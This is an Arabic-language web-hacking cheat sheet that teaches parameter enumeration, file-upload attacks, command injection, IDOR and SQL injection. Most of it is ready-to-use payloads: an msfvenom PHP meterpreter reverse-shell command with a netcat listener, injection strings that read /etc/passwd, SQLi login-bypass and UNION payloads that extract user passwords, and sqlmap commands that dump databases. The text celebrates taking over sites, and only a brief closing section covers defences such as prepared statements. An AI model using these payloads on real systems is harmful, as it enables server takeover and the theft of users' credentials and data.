🔹 Parameters Enumeration

الهدف: استخراج ومعرفة كل الـ parameters المخفية في الموقع لاستهدافها.

?id=1
?user=admin
?page=home

أدوات هامة: paramspider و Burp Suite

📂 1) File Upload Vulnerability

🧠 الفكرة:

الموقع بيسمحلك ترفع ملف (مثلاً Upload صورة)، تقوم أنت رافع Shell وتخترق السيرفر 😈.

❌ المشكلة:

مفيش فلترة للـ Extension أو الـ Content بتاع الملف.

💣 الهجوم (إنشاء Shell):
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
🎧 تشغيل الـ Listener:
nc -lvnp 4444

👉 ترفع shell.php > تفتحه في المتصفح > يجيلك Shell فوراً 🔥

⚡ 2) Command Injection

🧠 الفكرة:

إدخال أوامر Linux داخل الـ Input العادي للموقع.

الموقع الطبيعي:
ping 127.0.0.1
💣 الهجوم (تنفيذ أمرين معاً):
127.0.0.1; whoami
&& cat /etc/passwd

🔓 3) IDOR (خطيرة جداً)

🧠 الفكرة:

تغير رقم الـ ID في الرابط فتوصل لبيانات شخص تاني.

الموقع الطبيعي:
http://site.com/profile?id=1
💣 الهجوم:
http://site.com/profile?id=2

👉 هتشوف بيانات حساب رقم 2 🔥

💣 4) SQL Injection (أهم جزء 🔥🔥🔥)

🧠 الفكرة:

إدخال كود SQL خبيث بدل الـ Input العادي عشان تتلاعب بقاعدة البيانات وتسرق محتواها.

# شكل الاستعلام الطبيعي في قاعدة البيانات:
SELECT * FROM users WHERE username='admin' AND password='123'

🔥 أنواع وحيل SQL Injection

1️⃣ Login Bypass
' OR 1=1 --
النتيجة داخل السيرفر:
SELECT * FROM users WHERE username='' OR 1=1 --
👉 1=1 صحيحة دائماً، هتدخل كـ Admin بدون باسورد 🔥
2️⃣ UNION-based SQLi
استخراج الجداول:
' UNION SELECT table_name, NULL FROM information_schema.tables --
استخراج الأعمدة:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
استخراج البيانات:
' UNION SELECT username, password FROM users --
3️⃣ Error-based SQLi

لو الموقع بيظهر تفاصيل الـ Error في الصفحة، بنستغلها عشان نستخرج البيانات من نص الخطأ نفسه.

4️⃣ Blind SQL Injection

مفيش Output خالص! بس بنعرف عن طريق أسئلة (True / False).

' AND 1=1 -- (True)
' AND 1=2 -- (False)

🤖 5) أداة SQLMap (جبارة 🔥)

استخراج قواعد البيانات (DBs):
sqlmap -u "http://site.com/page?id=1" --dbs
استخراج الجداول (Tables):
sqlmap -u "URL" -D dbname --tables
استخراج البيانات (Dump Data):
sqlmap -u "URL" -D dbname -T users --dump

💻 سيناريو عملي كامل (SQLi)

# 1. لقيت صفحة Login أو Parameter.
# 2. جربت البايلود الأسطوري:
' OR 1=1 --
👉 الموقع دخل وبقيت Admin! 🔥
# 3. جربت هجوم UNION لاستخراج الجداول.
# 4. استخرجت جدول الـ Users.
# 5. حصلت على الـ Passwords وبقيت تملك الموقع بالكامل 🔥.

🛡️ الحماية وتأمين التطبيقات

  • Input validation: فلترة المدخلات والتأكد من نوعها.
  • Prepared statements: (Parameterized Queries) وهي الحل الأقوى للـ SQLi لمنع الخادم من تنفيذ الإدخال كأكواد.
  • Filtering & Sanitization: مسح وتشفير الرموز الخطيرة.
⚠️ مؤشرات وجود SQL Injection:

Error في الصفحة • اختلاف ملحوظ في شكل الـ Response • تخطي تسجيل الدخول بنجاح (Login Bypass).
